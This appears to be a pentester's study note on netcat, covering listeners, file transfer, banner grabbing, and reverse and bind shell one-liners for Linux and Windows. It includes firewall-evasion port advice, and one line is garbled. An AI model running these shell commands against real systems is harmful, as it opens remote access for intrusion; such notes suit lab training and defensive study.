---
{"dg-publish":true,"permalink":"/notes/netcat/"}
---

- "Swiss Army Knife" of networking.
- Perform all kinds of network interactions.
- Support [[TCP\|TCP]] and [[UDP\|UDP]]
- Used to receive reverse shells and connect to remote ports attached to bind shells on a target system.
- If you choose to use a **port below 1024**, you will need to use `sudo` when starting your listener.
- It's **good idea** to **use** a **well-known** port number (**80, 443 or 53** being good choices) as this is more likely to get **past** outbound **firewall rules** on the target.

| Command   | Description                                                                        |
| --------- | ---------------------------------------------------------------------------------- |
| `-l`      | is used to tell netcat that this will be a listener                                |
| `-n`      | tells netcat not to resolve host names or use DNS. avoid DNS lookups and warnings. |
| `-v`      | is used to request a verbose output                                                |
| `-p`      | indicates that the port specification will follow.                                 |
| `-vv`     | Very Verbose (optional)                                                            |
| `-k`      | Keep listening after client disconnects                                            |
| `-w SECS` | Timeout for connects and final net reads                                           |
| `-u`      | Over [[UDP\|UDP]]                                                                       |
# Normal Connection
Listener Machine 1
```shell
nc -lnvp PORT
```

Secondary Machine 2
```shell
nc -nv IP_MACHINE_1 PORT
```
# Transfer files
1. On the destination machine
```shell
nc -lnvp 1234 > file.txt
```
2. On the source machine
```shell
nc -nv IP_destination 1234 < file.txt
```

# Banner grabbing
Connect to a service to get the *Banner Grabber*
```shell
nc -nv IP PORT
```
# Reverse shell

## On the attacker (Listener)
65535 total number of ports
Start a listener using rlwrap to try to simulate an interactive console
``` sh
rlwrap nc -lnvp 4747
```
ncat has more options like encrypt with ssl
``` bash
ncat --ssl 127.0.0.1 30001
```
To open tcp/udp in a host, assosiate a shell to a port, force UDP/TCP conexions
```bash
nc localhost 4747
```
## On the target
### Linux
Send a bash
```sh
nc <LOCAL-IP> <PORT> -c /bin/sh
nc <LOCAL-IP> <PORT> -c /bin/bash
nc -e /dev/tcp/ipattacker/443 0>&1
```
Create a [[named pipe\|named pipe]]
this is **not included in most versions of netcat** as it is widely seen to be very insecure
```sh
mkfifo /tmp/f; nc <LOCAL-IP> <PORT> < /tmp/f | /bin/sh >/tmp/f 2>&1; rm /tmp/f
rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc <LOCAL-IP> <PORT> >/tmp/f
```
### Windows
**On Windows** this technique will **work perfectly**, where a static binary is nearly always required
Send a cmd
```sh
nc 10.10.38.232 443 -e “cmd.exe”
```
Send a powershell
```sh
nc 10.10.38.232 443 -e “powershell.exe”
```
# Bind shell
## On the target (Listener)
### Linux
```bash
nc -lnvp <port> -c /bin/sh
nc -lnvp <port> -c /bin/bash
```

On Linux, however, we would instead use this code to create a listener for a bind shell:
[[named pipe\|named pipe]]
```sh
mkfifo /tmp/f; nc -lvnp <PORT> < /tmp/f | /bin/sh >/tmp/f 2>&1; rm /tmp/f
```
### Windows
Or get a cmd on windows
```sh
nc -lvnp <port> -e "cmd.exe"
```
## On the attacker
```bash
nc -nv <target-ip> <chosen-port>
```
